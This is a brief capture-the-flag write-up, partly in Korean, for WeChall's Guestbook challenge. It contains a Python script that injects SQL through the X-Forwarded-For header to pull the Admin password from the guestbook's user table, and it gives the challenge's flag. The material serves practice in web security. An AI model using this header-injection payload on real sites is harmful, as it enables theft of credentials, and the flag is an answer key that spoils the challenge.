# [WeChall] The Guestbook - Writeup

## SQL Injection

`X-Forwarded-For` 헤더에 SQL Injection이 가능하다.

``` python
import urllib.parse, urllib.request

def main():
    url = 'http://www.wechall.net/challenge/guestbook/index.php'
    post_data = {
        'message':'hello',
        'sign':'Sign Guestbook'
    }
    headers = {
        'X-Forwarded-For':"',(select gbu_password from gbook_user where gbu_name='Admin' limit 1))#",
        'Content-Type':'application/x-www-form-urlencoded',
        'Cookie':'WC=**secret**;'
    }

    req = urllib.request.Request(url, urllib.parse.urlencode(post_data).encode(), headers)
    res = urllib.request.urlopen(req).read()
    res = str(res)

    print(res)

if __name__ == '__main__':
    main()
```

___

## Answer

flag: `TheBrownFoxAndTheLazyDog`